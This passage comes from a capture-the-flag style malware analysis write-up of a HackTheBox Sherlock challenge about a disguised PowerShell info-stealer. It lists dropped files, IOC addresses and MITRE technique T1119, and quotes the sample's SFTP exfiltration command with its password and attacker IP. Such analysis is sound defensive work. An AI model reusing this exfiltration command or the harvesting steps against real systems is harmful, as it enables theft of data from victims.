#### Directories Created
- `C:\Users\Public\Public Files`
- `C:\Users\Public\HelpDesk-Tools`
#### Files Created
- `C:\Users\<user>\Downloads\Superstar_MemberCard.tiff`
- `C:\Users\Public\Public Files\username.txt`
- `C:\Users\Public\Public Files\DCinfo.txt`
- `C:\Users\Public\Public Files\localusers.txt`
- `C:\Users\Public\Public Files\AVinfo.txt`
- `C:\Users\Public\Public Files\UserProcesses.txt`
- `C:\Users\Public\Public Files\ShareInfo.txt`
- `C:\Users\Public\Public Files\GPinfo.txt`
- `C:\Users\Public\HelpDesk-Tools\WinSCP.zip`
- `C:\Users\Public\HelpDesk-Tools\WinSCP.com`
- `C:\Users\Public\HelpDesk-Tools\maintenanceScript.txt`

*These files and directories will all be deleted once execution has completed.*
## Summary
Following analysis, the nature of the sample is clear and IOCs have been identified to assist in the detection of this malware. 

Let's move onto the questions to complete this Sherlock investigation.

# Question 1
**Question:** To accurately reference and identify the suspicious binary, please provide its SHA256 hash.

When identifying information regarding the sample we calculated the SHA256 hash. This can be done with the following command:

```bash
sha256sum Superstar_MemberCard.tiff.exe
```

**Answer:** 12daa34111bb54b3dcbad42305663e44e7e6c3842f015cccbbe6564d9dfd3ea3

# Question 2

**Question:** When was the binary file originally created, according to its metadata (UTC)?

We can obtain this information through our [VirusTotal analysis](https://www.virustotal.com/gui/file/12daa34111bb54b3dcbad42305663e44e7e6c3842f015cccbbe6564d9dfd3ea3) under the "Details" tab.

![VirusTotal file history details.](/assets/images/HeartBreaker-Continuum/Screenshot_2024-11-29-220726.png)

**Answer:** 2024-03-13 10:38:06

# Question 3

**Question:** Examining the code size in a binary file can give indications about its functionality. Could you specify the byte size of the code in this binary?

The code of a PE32 executable is stored within the `.TEXT` section. Luckily, VirusTotal provides the byte size for each section of the file. Scrolling down the 'Details' tab, you'll eventually see the 'Portable Executable Info' section that will have the byte size of the `.TEXT` section.

![VirusTotal section byte sizes.](/assets/images/HeartBreaker-Continuum/Screenshot_2024-11-29-221036.png)

**Answer:** 38400

# Question 4

**Question:** It appears that the binary may have undergone a file conversion process. Could you determine its original filename?

If we recall our strings analysis using `floss`, the original file name was `newILY.ps1`.

**Answer:** newILY.ps1

# Question 5

**Question:** Specify the hexadecimal offset where the obfuscated code of the identified original file begins in the binary.

For this question we'll have to open the file up in a hex editor and identify where the PowerShell script starts.

Opening the file up in `vwHexEditor` we'll see something like this:
![file in vwHexEditor with wrong encoding](/assets/images/HeartBreaker-Continuum/Screenshot_2024-11-29-221510.png)

If you've never used `vwHexEditor` to open a Windows executable then it is likely using the wrong encoding. Change this by going to "Options" -> "Preferences" and set "Encoding" to "Windows".
![Fix encoding issues](/assets/images/HeartBreaker-Continuum/Screenshot_2024-11-29-221529.png)

Finally, we can scroll down until we see the `$sCrt` followed by the base64 encoded string in the string view of the hex editor. Select the `$` part of the string and in the bottom of the screen note down the value of "Cursor Offset"

![Offset of file](/assets/images/HeartBreaker-Continuum/Screenshot_2024-11-29-221643.png)

The value is 11380, however this is a decimal number and the question is asking for it in hex. Launch Python using `python3` and enter

```python
hex(11380)
```
Which will return:
```python
'0x2c74'
```
**Answer:** 2c74

# Question 6

**Question:** The threat actor concealed the plaintext script within the binary. Can you provide the encoding method used for this obfuscation?

We know that the final stage of the malware was obfuscated using base64 encoding.

**Answer:** base64

# Question 7 

**Question:** What is the specific cmdlet utilized that was used to initiate file downloads?

Both the `.tiff` file and WinSCP program were downloaded by the script using the `Invoke-WebRequest` PowerShell cmdlet.

**Answer:** Invoke-WebRequest

# Question 8

**Question:** Could you identify any possible network-related Indicators of Compromise (IoCs) after examining the code? Separate IPs by comma and in ascending order.

During our analysis of the malware, we outlined several IOCs, including 2 IP addresses. These were 35.169.66.138, which was used to exfiltrate data from the victim, and 44.206.187.144, which was used to deliver files to the victim.

**Answer:** 35.169.66.138,44.206.187.144

*Ensure there are no spaces in your answer (yes this got me...)*

# Question 9

**Question:** The binary created a staging directory. Can you specify the location of this directory where the harvested files are stored?

Recalling our code analysis, the temporary staging directory where the `.txt` files containing information about the system were stored was `C:\Users\Public\Public Files`.

**Answer:** C:\Users\Public\Public Files

# Question 10

**Question:** What MITRE ID corresponds to the technique used by the malicious binary to autonomously gather data?

Referencing the [MITRE ATT&CK](https://attack.mitre.org/) enterprise matrix we can answer this question. The question is asking about gathering data - so the technique we're looking for is likely going to be under the "Collection" category. Under collection, we can see that `T1119 - Automated Collection` is one of the techniques used by adversaries and describes both what the script did and what the question is asking.

There are many other techniques that could also be assigned to this activity exhibited by the malware sample but the keyword in this question is "autonomously".

**Answer:** T1119

# Question 11

**Question:** What is the password utilized to exfiltrate the collected files through the file transfer program within the binary?

If we recall the `maintainenceScript.txt` file that was passed as an argument to the WinSCP SFTP client, we noted what appeared to be a password used to authenticate the SFTP connection.
```
open sftp://service:M8&C!i6KkmGL1-#@35.169.66.138/ -hostkey=*
```

**Answer:** M8&C!i6KkmGL1-#

# Conclusion
Overall, this was a fun activity to practise some basic malware analysis skills. It also paid homage to one of the OG Windows viruses, bringing a modern PowerShell twist to the classic VBScript ILOVEYOU worm. I hope to do some more writeups, as well as some more malware analysis, maybe next time outside the safety of a HackTheBox activity... I hope someone found this writeup interesting/helpful!